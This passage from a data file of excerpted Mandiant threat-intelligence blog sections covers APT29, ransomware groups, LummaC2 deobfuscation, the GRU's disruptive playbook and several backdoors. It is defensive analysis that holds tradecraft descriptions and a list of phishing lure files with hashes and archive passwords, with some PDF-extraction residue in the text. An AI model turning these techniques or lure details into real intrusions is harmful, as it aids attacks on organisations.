employed similar tradecraft, but of attacks that may employ these techniques in the future. ", "source": "mandiant"}, {"title": "Conclusion", "content": "We hope that this post has advanced the understanding of this compact, flexible, and stealthy Web shell. If you are reading this, you may be facing China Chopper right now - if so, we wish you success in eradicating this pest. In Part II, we examine the platform China Chopper runs on and describe its delivery mechanisms, traffic analysis and detection. ", "source": "mandiant"}, {"title": "Conclusion", "content": "The increased scope and frequency of APT29's diplomatic-focused spear phishing campaigns in the first half of 2023 has compelled the initial   \naccess team to make repeated modifications to its long-standing malware delivery chain. Efforts to move capabilities server side, introduce anti  \nanalysis components, and deliver decoy documents in non-compromise contexts have likely helped the group extend the shelf-life of its ROOTSAW-centred concept of operations. Even with this   \nunprecedented pace of change, the group has   \nremained highly operational security conscious, and has taken repeated steps to circumvent the   \nmethods that security researchers use to track and respond to its activity. \nAPT29's increased operational tempo has also exposed patterns of operations that likely reflect different initial access operators or subteams supported by a centralized development team. More generally, these patterns likely reflect a growing mission and pool of resources dedicated to collecting political intelligence and that group will almost certainly continue to pose a high severity threat to governments and diplomatic entities globally. ", "source": "mandiant"}, {"title": "Conclusion", "content": "The newest release of FLOSS extracts strings from Windows binaries written in Go and Rust. We hope this functionality supports analysts when triaging unknown programs. If you have any feedback or encounter issues using the tool please contact us via the FLOSS GitHub page. We're looking forward to working with the community to improve the extraction algorithms and support additional file formats. \nTo try out FLOSS' new functionality download a standalone binary from the Release page or use pip to install the tool from PyPI. You can then run the tool against any Windows PE Go or Rust sample to extract language-specific strings. Please refer to our documentation with more details on how to install and use FLOSS. \nPosted in Threat Intelligence-Security & Identity ", "source": "mandiant"}, {"title": "Conclusion", "content": "In part one of this blog series, we looked into color profiles, wrote a harness, hunted for corpus and successfully found multiple vulnerabilities. Stay tuned for part two, where we will be looking at a relatively less talked about vulnerability class: uninitialized memory. \nPosted in Threat Intelligence-Security & Identity ", "source": "mandiant"}, {"title": "Conclusion", "content": "Supply chain compromises are designed to abuse the trust in third party providers to indirectly gain access to a victim's environment, which can be difficult to detect. By proactively and consistently monitoring our customers for threats resulting from supply chain compromises, Mandiant Managed Defense was able to find this type of evil and assist our customers on remediation where malicious packages were installed within their environments. As a result of this, Mandiant did not identify any further malicious activity following the initial compromise at any of our customers. \nPrevention and Remediation \nCheck for the presence in your environment of any of the mentioned packages.   \nMake sure the installed \"coa\" package version is 2.0.2, latest stable at the time of writing.   \nMake sure the installed \"rc\" package version is 1.2.8, latest stable at the time of writing.   \nMake sure the installed \"ua-parser-js\" package versions are 0.7.30, 0.8.1 or 1.0.1, latest stable at the time of writing.   \nCheck for the existence on the environment of the malicious files detailed in this blog post and remove them (refer to the IOC section).   \nAny secrets or credentials should be considered compromised on the infected host and changed.   \nConsider locking version numbers of packages to prevent from auto-installing a new package that may be malicious ", "source": "mandiant"}, {"title": "Overview", "content": "An obfuscating compiler, which we will also informally refer to as an \"obfuscator,\" is a transformation tool designed to enhance the security of software binaries by making them more resilient to binary analysis. It operates by transforming a given binary into a protected representation, thereby increasing the difficulty for the code to be analyzed or tampered with. These transformations are typically applied at a perfunction basis where the user selects the specific functions to apply these transformations to. \nObfuscating compilers are distinct from packers, although they may incorporate packing techniques as part of their functionality. They fall under the broader classification of software protections, such as OLLVM, VMProtect, and Code Virtualizer, which provide comprehensive code transformation and \nprotection mechanisms beyond simple packing. Notably, for all protected components, the original code will never be exposed in its original, unprotected form at any point during the runtime of a protected binary. It is also common for obfuscating compilers to mix the original compilergenerated code with obfuscator-introduced code. This generally tends to necessitate a comprehensive deobfuscator from an analyst in order to analyze the binary. \nThe obfuscator employed by LummaC2 applies a multitude of transformations consistent with standard obfuscating compiler technology. Our concern only focuses on the newly introduced control flow protection scheme that we uncovered. \nOur analysis strongly suggests that the authors of the obfuscator have intimate knowledge of the LummaC2 stealer. Certain parts of the protection, as described in the upcoming sections, are specialized to handle specific components of the LummaC2 stealer. ", "source": "mandiant"}, {"title": "Conclusion", "content": "In this blog post, we have explored the inner workings of LummaC2's obfuscation technique using indirect jumps to manipulate control flow. By leveraging backward slicing and symbolic execution, we have been able to consistently identify the original instructions and eliminate dispatcher \ninstructions added by the obfuscator. Furthermore, we have discussed strategies for deobfuscation, including rebuilding the original function from the recovered control flow and addressing relocation challenges. \nWhile this blog post focuses on deobfuscating LummaC2 protected subroutines, the power of backward slicing as a binary analysis technique extends well beyond this specific case. We hope our exploration of deobfuscating LummaC2 through the use of backward slicing has provided valuable insights to fellow analysts tackling similar challenges in the ever-evolving realm of reverse engineering and malware analysis. ", "source": "mandiant"}, {"title": "Targeting", "content": "UNC4393 is a financially motivated threat cluster, and the primary user of BASTA ransomware, tracked since mid-2022 but likely active since early 2022 based on activity on the BASTA DLS.  The group has overwhelmingly leveraged initial access gained via UNC2633 and UNC2500 QAKBOT botnet infections to deploy BASTA ransomware. QAKBOT is typically distributed via phishing emails containing malicious links or attachments. In some cases, HTML smuggling has also been used to distribute ZIP files containing IMG files that house LNK files and QAKBOT payloads. \nMandiant suspects BASTA operators maintain a private or small, closedinvitation affiliate model whereby only trusted third-party actors are provided with use of the BASTA encryptor. Unlike traditional ransomwareas-a-service (RaaS), BASTA is not publicly marketed and its operators do not appear to actively recruit affiliates to deploy the ransomware. Instead, they focus on acquiring initial access via partnerships or purchases in underground communities. This deviates from traditional RaaS models, which focus on the ransomware development and related services such as the data leak site (DLS) that are provided to affiliates in exchange for directly distributing the ransomware. While UNC4393 is the only currently active threat cluster deploying BASTA that Mandiant tracks, we cannot rule out the possibility that other, vetted threat actors may also be given access to the encrypter. \nThe hundreds of BASTA ransomware victims claimed on the DLS appear credible due to UNC4393's rapid operational tempo. With a median time to ransom of approximately 42 hours, UNC4393 has demonstrated proficiency in quickly performing reconnaissance, data exfiltration, and completing actions on objectives. ", "source": "mandiant"}, {"title": "Conclusion", "content": "UNC4393 has proven to be an adaptable and prolific threat actor in the cyber crime landscape. Its evolution from opportunistic QAKBOT infections to strategic partnerships with initial access brokers demonstrates a willingness to diversify and optimize its operations. Notably, while BASTA has been in the top DLSs that we track, the number of victims has steadily declined in recent months (Figure 8). Although July is not yet over, with less than a week remaining, any significant change to the downward trend seems unlikely. It is plausible that this decline reflects difficulties in obtaining a reliable stream of initial access. \nWhile its early reliance on readily available tools has shifted towards custom malware development, its core focus on efficient data exfiltration and multi-faceted extortion remains constant. Further, the transition from manual ransomware deployment to the development of KNOTROCK exemplifies UNC4393's commitment to improving its tactics. This, combined with its swift operational tempo, poses a significant challenge to defenders. The cluster's avoidance of healthcare institutions and its global reach further underscore its calculated and financially driven approach. \nAs the threat landscape continues to evolve, understanding the intricacies of UNC4393's operations becomes crucial for organizations seeking to protect themselves. UNC4393's ability to adapt, innovate, and leverage various tools and techniques highlights the need for proactive and robust security measures. ", "source": "mandiant"}, {"title": "Conclusion", "content": "As attackers continue to find new techniques to evade detection and technologies to persist on, defenders must continue to evolve as well. To be able to identify when advanced threat actors are present in the environment, defenders need to not only focus on building out a workflow that alerts on known indicators, but also has a strong baseline understanding of expected activity to notify when abnormalities occur. This process is not an easy or quick one to implement, but the benefits achieved in establishing this system are twofold. In addition to greater visibility, knowing and documenting your own environment to this degree enables streamlined communication and quicker response times when attackers do make their way through whatever preventative measures are in place. ", "source": "mandiant"}, {"title": "Overview", "content": "Android applications are primarily written in Java. To run on Android devices, the Java code is compiled into Java bytecode, and then translated into Dalvik bytecode. The Dalvik bytecode can be found in DEX (Dalvik Executable) files in the APK. An APK (Android Package Kit) is essentially a ZIP file that contains an application's code and needed resources. It is possible to examine DEX files by extracting the APK's contents. \nDEX files are divided into several sections, including a header, string table, class definitions, method code, and other data. Most sections are divided into chunks of equal size that hold multiple values to define the items in the section. To show how common concepts in Java such as classes or strings are translated in a DEX file, we will use the  class_defs  section as an example. ", "source": "mandiant"}, {"title": "Appendix", "content": "CIB (Coordinated, inauthentic behavior): Groups of online assets that work together to mislead others about who they are and what they are doing (modified from Meta's definition of CIB). \nDeepfake: Synthetic media, such as images or videos, generated using machine learning, which may be used to deceive target audiences by IO actors. \nDisinformation: The intentional seeding or amplification of false information. \nGenerative Adversarial Network (GAN): A deep learning model architecture that consists of two sub-models, a generator and discriminator. The generator learns to create synthetic samples based on an original dataset with the goal of developing visuals that are realistic enough that the discriminator cannot distinguish real from synthetic. \nHack and Leak: Intrusion and subsequent release of extracted data with intent to influence. \nImpersonator: An attempt to pose as another individual or entity. \nInauthentic Account: A general term for an account that dishonestly presents its identity. May be human operated or automated. \nInformation Operations (The Tactic): The use of coordinated, inauthentic online assets and/or deceptive tactics to influence target audiences. \nInformation Operation (The Activity): A specific instance of an actor's deliberate use of deceptive tactics to manipulate a target information environment regarding a given topic or incident. \nInfluence Campaign / Information Operations Campaign: Multiple information operations assessed to comprise part of a larger effort; these are typically executed over an extended period. \nIO Assets: Actor-controlled online resources including for example social accounts, domains or email addresses used to support IO activity. \nMisinformation: Unintentional spreading of false information. \nNetwork: A group of individual assets that we assess to be acting in a coordinated and inauthentic manner. \nOnline Influence Activity: Intentional efforts to manipulate target information environments online in the interest of a threat actor or state sponsor. May use a range of tactics including those mentioned in IO, public messaging through diplomats or state media, and national-level content censorship by authoritarian regimes. \nPropaganda: The dissemination of one-sided information in an effort to influence public \nHow to Understand and Action Mandiant's Intelligence on Information Operations | Mandiant | Google Cloud Blog information. Usually comes from nation-states or parties. Dishonest connotation. \nPublic Messaging: Efforts from governments to communicate with foreign publics. Typically involves counter messaging to perceived adversary messaging and attempts to spread true information. \nPosted in Threat Intelligence-Security & Identity ", "source": "mandiant"}, {"title": "Conclusion", "content": "Although UNC2190 is a lesser known and potentially a smaller ransomware affiliate group, it's smaller size and repeated rebranding has allowed it to avoid much public scrutiny. In Mandiant's 2021 Trends and 2022 Predictions report, ransomware data theft operations affecting healthcare are noted as having increased from January 2020 to June 2021, despite some groups claiming they would avoid targeting hospitals. UNC2190 has continued to operate over the past year while making only minor changes to their strategies and tooling, including the introduction of a commercial packer and the rebranding of their service offering. This highlights how well-known tools, such as BEACON, can lead to impactful and lucrative incidents even when leveraged by lesser-known groups. ", "source": "mandiant"}, {"title": "Introduction", "content": "Advanced Practices is known for using primary source data obtained through Mandiant Incident Response, Managed Defense, and product telemetry across thousands of FireEye clients. Regular, first-hand observations of threat actors afford us opportunities to learn intimate details of their modus operandi. While our visibility from organic data is vast, we also derive value from thirdparty data sources. By looking outwards, we extend our visibility beyond our clients' environments and shorten the time it takes to detect adversaries in the wild-often before they initiate intrusions against our clients. \nIn October 2019, Aaron Stephens gave his \"Scan't Touch This\" talk at the annual FireEye Cyber Defense Summit (slides available on his Github). He discussed using network scan data for external detection and provided examples of how to profile command and control (C2) servers for various postexploitation frameworks used by criminal and intelligence organizations alike. However, manual application of those techniques doesn't scale. It may work if your role focuses on one or two groups, but Advanced Practices' scope is much broader. We needed a solution that would enable us to track thousands of groups, malware families and profiles. In this blog post we'd like to talk about that journey, highlight some wins, and for the first time publicly, introduce the project behind it all: SCANdalous. ", "source": "mandiant"}, {"title": "Conclusion", "content": "There are hundreds more stories to tell, but the point is the same. When we find value in an analytical workflow, we ask ourselves how we can do it better and faster. The automation we build into our tools allows us to not only accomplish more of the work we were doing manually, it enables us to work on things we never could before. Of course, the conversion doesn't happen all at once. Like all good things, we made a lot of incremental improvements over time to get where we are today, and we're still finding ways to make more. Continuing to innovate is how we keep moving forward \u2013 as Advanced Practices, as FireEye, and as an industry. ", "source": "mandiant"}, {"title": "Summary", "content": "FireEye has uncovered a widespread campaign, that we are tracking as UNC2452. The actors behind this campaign gained access to numerous public and private organizations around the world. They gained access to victims via trojanized updates to SolarWind's Orion IT monitoring and management software. This campaign may have begun as early as Spring 2020 and is currently ongoing. Post compromise activity following this supply chain compromise has included lateral movement and data theft. The campaign is the work of a highly skilled actor and the operation was conducted with significant operational security. ", "source": "mandiant"}, {"title": "Conclusion", "content": "While our journey of statistical PDB analysis did not yield a magic malware classifier, it did yield a number of useful findings that we were hoping for: \n1. We developed several file path feature functions which are transferable to other models under development.   \n2. By diving into statistical analysis of the dataset, we were able to identify new keywords and logic branches to include in YARA signatures. These signatures have since been deployed and discovered new malware samples.   \n3. We answered a number of our own general research questions about PDB paths, and were able to dispel some theories we had not fully tested with data. \nWhile building an independent classifier was not the primary goal, improvements can surely be made to improve the end model accuracy. Generating an even larger, more diverse dataset would likely make the biggest impact on our accuracy, recall, and precision. Further hyperparameter tuning and feature engineering could also help. There is a large amount of established research into text classification using various deep learning methods such as LSTMs, which could be applied effectively to a larger dataset. \nPDB paths are only one small family of file paths that we encounter in the field of cyber security. Whether in initial infection, staging, or another part of the attack lifecycle, the file paths found during forensic analysis can reveal incredibly useful information about adversary activity. We look forward to further community research on how to properly extract and represent that information. \nPosted in Threat Intelligence-Security & Identity ", "source": "mandiant"}, {"title": "Conclusion", "content": "I hope you enjoy this new free tool and will adopt it as another trusted resource to perform reverse engineering and malware analysis tasks. Next time \n2025/5/7 11:37 \nFLARE VM: The Windows Malware Analysis Distribution You've Always Needed! | Mandiant | Google Cloud Blog you need to set up a new malware analysis environment, try out FLARE VM! \nIn these few pages, we could only scratch the   \nsurface of everything that FLARE VM is capable of; however, feel free to leave your comments, tool requests, and bugs on our Github issues page here: https://github.com/fireeye/flare-vm or   \nhttp://flarevm.info/. \nPosted in Threat Intelligence ", "source": "mandiant"}, {"title": "Attribution", "content": "In August 2021, a disgruntled CONTI affiliate leaked training documents, playbooks, and tools used to assist in CONTI ransomware operations. Mandiant has determined that some of the activity listed above overlaps with techniques in the playbooks disclosed in August. \nAt this time, due to the public release of this information, other unaffiliated actors may be replicating the techniques for their own motives and objectives. These victims seem to operate in a wide range of industries. The threat group's motivations are currently unknown, but we suspect that the group is financially motivated based on the seemingly industry-agnostic leading to ransomware activity. ", "source": "mandiant"}, {"title": "Conclusion", "content": "In this post we introduced Ghidrathon, a Ghidra extension that adds Python 3 scripting capabilities to Ghidra that tightly integrates with Ghidra's UI. We are excited to release Ghidrathon to the community and hope it encourages you to start extending Ghidra using modern Python 3. Check out our README for information on building and installing Ghidrathon for your environment. Please contact us via the tool's GitHub page if you have any comments, questions, or run into any issues. ", "source": "mandiant"}, {"title": "Background", "content": "In early 2022, Mandiant predicted that Russian cyber threat activity associated with the invasion of Ukraine would affect government and private sector targets in third-party countries, particularly neighboring countries, North Atlantic Treaty Organization (NATO) allies, and other nations voicing support for Ukraine. Russian governmentlinked actors have historically employed false hacktivist facades as a means of obscuring their role in targeting Western countries. Mandiant has previously identified instances of self-proclaimed hacktivist groups coordinating with such actors in the context of the war. \nWhile we have not observed direct ties between KillNet and the Russian government, we cannot exclude the possibility of coordination, or more substantial ties, between some or all groups comprising the collective. We expect KillNet and its affiliates to continue conducting distributed denialof-service (DDoS) and hack-and-leak operations intended to disrupt government and critical infrastructure functions in countries providing financial, economic, diplomatic or military support to Ukraine. \nMandiant has tracked KillNet activity back to January 2022, despite a claim by the collective's alleged founder that it began operations in 2021. This claim could be an attempt to separate the group from Russian government interests and establish its legitimacy as a genuine hacktivist collective.   \nThe collective has claimed responsibility for DDoS attacks, data theft, and leaks against entities across multiple industries, including transportation, defense, government and military, financial services, global institutions, and telecommunications.   \nKillNet's targeting has consistently aligned with established and emerging Russian geopolitical priorities, which suggests that at least part of \nthe influence component of this hacktivist activity is intended to directly promote Russia's interests within perceived adversary nations visa-vis the invasion of Ukraine. The collective's activity also supports domestic Russian promotion of support for the war. As Russian government rhetoric has focused on various nations, we observed the group claim attacks targeting those same nations shortly thereafter. \nSince the beginning of 2023, the majority of observed KillNet targeting has focused on the U.S., Europe, and international institutions such as NATO. We have previously observed targeting in countries including Germany, Denmark, Sweden, France, Poland, Slovakia, Ukraine, Israel, the United Arab Emirates (UAE), and other NATO ally and partner countries such as Japan. ", "source": "mandiant"}, {"title": "Conclusion", "content": "In a world with over 20,000 cryptocurrency tokens, bridge protocols play a crucial role in facilitating interoperability between these networks and in doing so, create a lucrative target for threat actors. This is evident by the fact that nearly \\$2 billion has been stolen from these cross-chain protocols in 2022 alone. \nThe speed at which money flows in cryptocurrency networks is part of its appeal, as the traditional finance system moves much slower and has higher Know Your Customer (KYC) standards. However, this speed of transaction and lower compliance standard is what aids threat actors to steal, move the money quickly, and in many cases, allows for the obfuscation of stolen funds, therefore easing the conversion to fiat currency (e.g. Rubbles, Yuan, Dollars, etc.), other tokens, or tangible assets within minutes or hours. While on-chain analysis is helpful at proving the path illicit funds take postcompromise, services such as mixers, DeFi swap pools, and non-KYC exchanges present a challenge to security researchers, law enforcement, and governments. \nAs this innovative sector continues to grow, Mandiant assesses with high confidence that bridge protocols will continue to be an attractive target for threat actors for the foreseeable future, and we recommend any organization or developer(s) working to design such a protocol to perform extensive security auditing prior to and during operation, while continuously assessing the onchain transactional risk. \nPosted in Threat Intelligence-Security & Identity ", "source": "mandiant"}, {"title": "Introduction", "content": "Single-page applications (SPAs) are popular due to their dynamic and user-friendly interfaces, but they can also introduce security risks. The client-side rendering frequently implemented in SPAs can make them vulnerable to unauthorized access and data manipulation. This blog post will explore the vulnerabilities inherent in SPAs, including routing manipulation, hidden element exposure, and JavaScript debugging, as well as provide recommendations on how to mitigate these risks. ", "source": "mandiant"}, {"title": "Summary", "content": "On February 24, 2022, Russia invaded Ukraine with troops massed on the border of the two countries that had been building since the previous fall. As Mandiant has detailed previously in reports such as M-Trends 2023 and other resources available in our Ukraine Crisis Resource Center, we have tracked Russian cyber operations against Ukraine both leading up to and following the invasion. We categorize these operations stretching back before the start of the war on February 24, 2022, into six phases, spanning access operations, cyber espionage, waves of disruptive attacks, and information operations. \nAlthough there has been a significant focus on the sheer volume of wiper activity and the perception of \"success\" of these disruptive operations, there is more to the story of Russian military intelligence (GRU) disruptive operations than just wipers. We have observed the same five components being executed across the disruptive operations in Ukraine, combining the GRU's cyber and information operations into a unified wartime capability. To equip defenders with knowledge of this standard operational approach, we have outlined the GRU's disruptive playbook, which expands on the patterns of tactical and strategic behavior Mandiant has observed. To demonstrate the playbook in action, we examine a UNC3810 operation targeting a Ukrainian government entity with CADDYWIPER that took place in the fifth phase of the war, a renewed campaign of disruptive attacks at the end of 2022. ", "source": "mandiant"}, {"title": "Overview", "content": "Since Russia's invasion of Ukraine, Mandiant Intelligence has observed the GRU operate a standard, repeatable playbook to pursue its information confrontation objectives. The persistent use of this playbook through the six phases of Russia's war has indicated its high adaptability across a range of different operational contexts, targets, and over 15 different destructive malware variants. The playbook has also proved highly survivable and resilient to detection and technical countermeasures, allowing the GRU to adhere to a common set of tactics, techniques and procedures (TTPs) despite an extended period of aggressive, high tempo operational use. Mandiant has observed the playbook in use by multiple distinct Russian threat clusters throughout the war, indicating its central role in standardizing operations across multiple subteams in an attempt to deliver more repeatable, consistent effects. \nAcross the incidents Mandiant has responded to, we have seen suspected GRU threat clusters generally adhere to the following five operational phases: \n1. Living on the Edge: Leveraging hard-to-detect compromised edge infrastructure such as routers, VPNs, firewalls, and mail servers to gain and regain initial access into targets. \n2. Living off the Land: Using built-in tools such as operating system components or pre-installed software for reconnaissance, lateral movement and information theft on target networks, likely aiming to limit their malware footprint and evade detection. \n3. Going for the GPO: Creating persistent, privileged access from which wipers can be deployed via group policy objects (GPO) using a tried-and-true PowerShell script. \n4. Disrupt and Deny: Deploying \"pure\" wipers and other low-equity disruptive tools such as ransomware to fit a variety of contexts and scenarios. \n5. Telegraphing \"Success\": Amplifying the narrative of successful disruption via a series of hacktivist personas on Telegram, regardless of the actual impact of the operation. \nThe GRU's Disruptive Playbook | Mandiant | Google Cloud Blog \nMandiant assesses with moderate confidence that this standard concept of operations highly likely represents a deliberate effort to increase the speed, scale, and intensity at which the GRU could conduct offensive cyber operations while minimizing the odds of detection. The benefits the playbook affords are notably suited for a fast-paced and highly contested operating environment, indicating that Russia's wartime goals have likely guided the GRU's chosen tactical courses of action. While other options have existed at each stage of the playbook, the GRU has opted for the same tradecraft repeatedly. We anticipate that similar operational approaches, or \"playbooks\", may be mirrored in future crises and conflict scenarios where requirements to support high volumes of disruptive cyber operations are present. \nThe GRU's disruptive playbook has sought to integrate the full spectrum of information confrontation (\u0418\u043d\u0444\u043e\u0440\u043c\u0430\u0446\u0438\u043e\u043d\u043d\u043e\u0435 \u043f\u0440\u043e\u0442\u0438\u0432\u043e\u0431\u043e\u0440\u0441\u0442\u0432\u043e) capabilities that Russia conceptually defines as cryptographic reconnaissance of information and communication systems (KRIKS), informationtechnical effects (ITV), and information-influence effects (IPV). While these concepts generally map to what the threat intelligence community commonly refers to as access operations and their follow-on espionage, attack, and influence missions, it is important to understand how Russia defines these concepts and seeks to incorporate the different components of its cyber program in its own terms. A particular feature of the playbook, and more generally of the GRU's information confrontation over the years, has been its emphasis on the information-psychological effects from its cyber operations, which we judge has driven its overarching focus of its disruptive operations on Ukrainian government and civilian critical infrastructure. ", "source": "mandiant"}, {"title": "Conclusion", "content": "The GRU's disruptive operations in Ukraine have revealed a series of tactical choices Russia's military has made to achieve its wartime information confrontation objectives. These adaptations have assisted the GRU to balance different strategic priorities for espionage and attack and to integrate its cyber and information operation capabilities into a unified, repeatable playbook that could be used across multiple distinct Russian threat clusters. \nMany of the components of the GRU's disruptive playbook are not new. They have been historically used in different ways. But in Ukraine, they have been uniquely combined and tailored to meet the requirements of operating at scale in a fast-paced and highly contested wartime environment while avoiding detection. As this playbook has almost certainly been purpose-built for Russia's invasion, we judge that these specific tactical adaptations may be mirrored in future crises and conflict \nscenarios where requirements to support high volumes of disruptive cyber operations are also present. \nIt is important to note that this playbook is not wholly unique to Russia's war in Ukraine. Financiallymotivated ransomware operations also follow a similar playbook, abusing vulnerabilities in edge infrastructure for initial access, living off the land, and modifying GPOs to spread and execute their malware. We believe that the convergent use of these tactics is likely driven by a common desire to reduce the breakout time from initial access to malware delivery and to maximize the disruptive effect in a target environment. Consequently, preparations to monitor, detect, and respond to the TTPs used in Russia's wartime cyber playbook will have transferable benefits for defending against tradecraft commonly used by ransomware groups as well. \nPosted in Threat Intelligence ", "source": "mandiant"}, {"title": "Conclusion", "content": "Researchers, analysts, and threat hunters need every advantage when identifying connections between large datasets. While the research documented in this post is specific to Chromium-based extensions and APKs, the theory of permhash is extensible and applicable to all filetypes that declare their permissions, increasing the potential for impact. The use of permhash, as demonstrated in this research, can be adopted to illuminate previously unknown related samples through pivoting and clustering. ", "source": "mandiant"}, {"title": "Overview", "content": "GRIMPLANT is a backdoor written in GO which reaches out using Google RPC to a Base64- encoded and AESCTS-encrypted C&C read from a command-line argument. GRIMPLANT conducts a system survey which it uploads to the C&C and can execute commands provided by the C&C on the victim's device. \nGRAPHSTEEL is an infostealer which appears to be a modified, weaponized version of the public Github project goLazagne. GRAPHSTEEL gathers a survey of the victim machine including browser credentials, enumerates drives D \u2013 Z, and uploads files to the C&C. ", "source": "mandiant"}, {"title": "Targeting", "content": "The infection vector is currently uncertain, but we suspect the malicious files may have been delivered via phishing email. It is important to note that Remote Utilities comes in a UPX-packed SFX RAR from the vendor, and it does not appear the attackers changed the default. However, the attackers appear to have used several layers of password-protected archives before dropping and executing the default UPX-packed SFX extractor with a SFX RAR. The lure documents all reference an \"evacuation plan\" allegedly originating from the Ukrainian SBU. \n\u043f\u043b\u0430\u043d \u0435\u0432\u0430\u043a\u0443\u0430\u0446\u0456\u0457 (\u0437\u0430\u0442\u0432\u0435\u0440\u0434\u0436\u0435\u043d\u0438\u0439 \u0441\u0431\u0443 28.02.20 \u043d\u0430\u043a\u0430\u0437\u043e\u043c \u2116 009363677833).rar_pass_123.zip (MD5: cd8834da2cfb0285fa75decf6c67d049) Password-protected ZIP file Password: 123   \n\u041f\u043b\u0430\u043d \u0435\u0432\u0430\u043a\u0443\u0430\u0446\u0456\u0457 (\u0437\u0430\u0442\u0432\u0435\u0440\u0434\u0436\u0435\u043d\u0438\u0439 \u0421\u0411\u0423 28.02.20 \u041d\u0430\u043a\u0430\u0437\u043e\u043c \u2116 009363677833).rar (MD5: 3cd599654aff2e432ae3390d33c64f5e) RAR containing RAR SFX and text file with RAR passwords   \n\u043a\u043e\u0434 \u0434\u043e\u0441\u0442\u0443\u043f\u0443.txt (MD5: 144ccb808e2d2e1f0119ea2a8f7490bc) Text file with RAR password Password: 2267903645   \n2b0338c9f3f46955cfd2dc97c02bd554 (application/x-rar) \u043f\u043b\u0430\u043d \u0435\u0432\u0430\u043a\u0443\u0430\u0446\u0456\u0457 (\u0437\u0430\u0442\u0432\u0435\u0440\u0434\u0436\u0435\u043d\u0438\u0439 \u0441\u0431\u0443 28.02.2022 \u043d\u0430\u043a\u0430\u0437\u043e\u043c \u2116 009363677833).part1.rar Password-protected SFX RAR Password: 2267903645 Contains: \u041f\u043b\u0430\u043d \u0435\u0432\u0430\u043a\u0443\u0430\u0446\u0456\u0457 (\u0437\u0430\u0442\u0432\u0435\u0440\u0434\u0436\u0435\u043d\u0438\u0439 \u0421\u0411\u0423 28.02.2022 \u041d\u0430\u043a\u0430\u0437\u043e\u043c \u2116 009363677833).exe (MD5: ea47d88d73fecb1fad1e737f1b373d7f)   \n97e16c0b770dbbe4fa94cebac92082b7 (application/x-rar) \u043f\u043b\u0430\u043d \u0435\u0432\u0430\u043a\u0443\u0430\u0446\u0456\u0457   \nEvacuation and Humanitarian Documents used to Spear Phish Ukrainian Entities | Man (\u0437\u0430\u0442\u0432\u0435\u0440\u0434\u0436\u0435\u043d\u0438\u0439 \u0441\u0431\u0443 28.02.2022 \u043d\u0430\u043a\u0430\u0437\u043e\u043c \u2116 009363677833).part2.rar Password-protected SFX RAR Password: 2267903645 Contains: \u041f\u043b\u0430\u043d \u0435\u0432\u0430\u043a\u0443\u0430\u0446\u0456\u0457 (\u0437\u0430\u0442\u0432\u0435\u0440\u0434\u0436\u0435\u043d\u0438\u0439 \u0421\u0411\u0423 28.02.2022 \u041d\u0430\u043a\u0430\u0437\u043e\u043c \u2116 009363677833).exe (MD5: ea47d88d73fecb1fad1e737f1b373d7f)   \n\u041f\u043b\u0430\u043d \u0435\u0432\u0430\u043a\u0443\u0430\u0446\u0456\u0457 (\u0437\u0430\u0442\u0432\u0435\u0440\u0434\u0436\u0435\u043d\u0438\u0439 \u0421\u0411\u0423 28.02.2022 \u041d\u0430\u043a\u0430\u0437\u043e\u043c \u2116 009363677833).exe (MD5: ea47d88d73fecb1fad1e737f1b373d7f) Translation: Evacuation Plan (approved by SBU 28.02.2022 in order \u2116 009363677833).exe UPX-packed SFX extractor; likely default for Remote Utilities Unpacked: MD5: a236cb7f2b0e34619039788de7f7760b   \nC:\\Program Files (x86)\\Remote Utilities \u2013 Host\\ rutserv.exe (MD5: 2bb5d5aa07fa2c8e9874c117c8fa51d6) RemoteUtils utility ", "source": "mandiant"}, {"title": "Overview", "content": "UNC1151 is a cluster of cyber espionage activity which has links to the Belarusian government. (Please see our previously published blog on UNC1151 for additional details). UNC1151 also provides technical support to the Ghostwriter information operations campaign. Though we cannot rule out Russian contributions to either UNC1151 or Ghostwriter activities, we have not yet identified evidence of any collaboration between Russian APTs and UNC1151. \nUNC1151 primarily targets government and media entities focusing on Ukraine, Lithuania, Latvia, Poland, and Germany. UNC1151 has been active in targeting primarily Ukraine and Poland since the Russian invasion of Ukraine in February. ", "source": "mandiant"}, {"title": "Overview", "content": "BEACON is a backdoor written in $\\mathsf{C}/\\mathsf{C}++$ that is part of the Cobalt Strike framework. Supported backdoor commands include shell command execution, file transfer, file execution, and file management. BEACON can also capture keystrokes and screenshots as well as act as a proxy server. BEACON may also be tasked with harvesting system credentials, port scanning, and enumerating systems on a network. BEACON communicates with a C&C server via HTTP or DNS. \nMICROBACKDOOR is a client backdoor and serverside tool which has been available on GitHub since May 2021. MICROBACKDOOR was developed by 'Cr4sh' (aka. Dmytro Oleksiuk), who has also developed other notable malware used by Russian APTs including BlackEnergy. MICROBACKDOOR can upload and download files, execute commands, update itself, and take screenshots. It also supports HTTP, Socks4 and Socks5 proxies to route traffic. \nNote: the version of MICROBACKDOOR used by UNC1151 in this report has been modified by the actor to include a screenshot functionality. Screenshot functionality is not present in the version of MICROBACKDOOR available on Github. ", "source": "mandiant"}, {"title": "Conclusion", "content": "CVE-2016-2060 has been present on devices since at least 2011 and likely affects hundreds of Android models around the world. This vulnerability allows a seemingly benign application to access sensitive user data including SMS and call history and the ability to perform potentially sensitive actions such as changing system settings or disabling the lock screen. Devices running Android 4.3 (\"Jellybean \n2025/5/7 11:43 \n${\\mathsf{M R2^{\\prime\\prime}}})$ ) or older are the most affected by the vulnerability, and are likely to remain unpatched. Newer devices utilizing SEAndroid are still affected, but to a lesser extent. \nFireEye would like to thank Qualcomm for both working diligently to address CVE-2016-2060 and for supporting the release of this blog post. For FireEye Mobile Threat Prevention (MTP) customers, FireEye has added detection of CVE-2016-2060 exploitation on devices as of writing this blog post. \nPosted in Threat Intelligence-Security & Identity ", "source": "mandiant"}, {"title": "Conclusion", "content": "The registry can provide a wealth of data for a forensic investigator. With numerous sources of deleted and historical data, a more complete picture of attacker activity can be assembled during an investigation. As attackers continue to gain sophistication and improve their tradecraft, investigators will have to adapt to discover and defend against them. ", "source": "mandiant"}, {"title": "Appendix", "content": "Registry transaction logs contain records with the following format: \nThe magic number is always 0x280000.   \nThe record size includes the header.   \nThe record type is always 1. \nOperation type 1 is key creation. Operation type 2 is key deletion. Operation types 3-8 are value write or delete. It is not known what the different types signify. \nThe key path size is at offset 40 and repeated at offset 42. This is present for all registry operation types. \nFor registry key write and delete operations, the key path is at offset 72. \nFor registry value write and delete operations, the following data is present: \nThe data for value records starts at offset 88. It contains the key path followed by the value name optionally followed by data. If data size is nonzero, the record is a value write operation; otherwise it is a value delete operation. \nPosted in Threat Intelligence-Security & Identity ", "source": "mandiant"}, {"title": "Targeting", "content": "Mandiant has no information to indicate that any of the PE infectors we 